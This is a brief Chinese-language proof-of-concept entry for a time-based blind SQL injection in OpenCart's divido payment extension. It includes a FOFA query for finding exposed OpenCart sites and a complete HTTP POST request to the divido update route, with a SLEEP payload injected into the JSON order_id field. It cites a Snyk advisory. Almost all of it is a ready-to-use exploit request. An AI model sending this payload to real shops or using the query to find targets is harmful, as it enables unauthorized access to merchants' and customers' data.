## OpenCart开源电子商务平台divido.php存在SQL注入漏洞

## fofa

```
app="OpenCart-开源免费PHP商城"
```

## poc

```
POST /index.php?route=extension/payment/divido/update HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/json
content-length: 44

{"status":true,"metadata":{"order_id":"1 AND (SELECT 6684 FROM (SELECT(SLEEP(5)))mUHr)"}}
```

![image-20240628175420361](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406281754398.png)

## 漏洞来源

- https://security.snyk.io/vuln/SNYK-PHP-OPENCARTOPENCART-7266565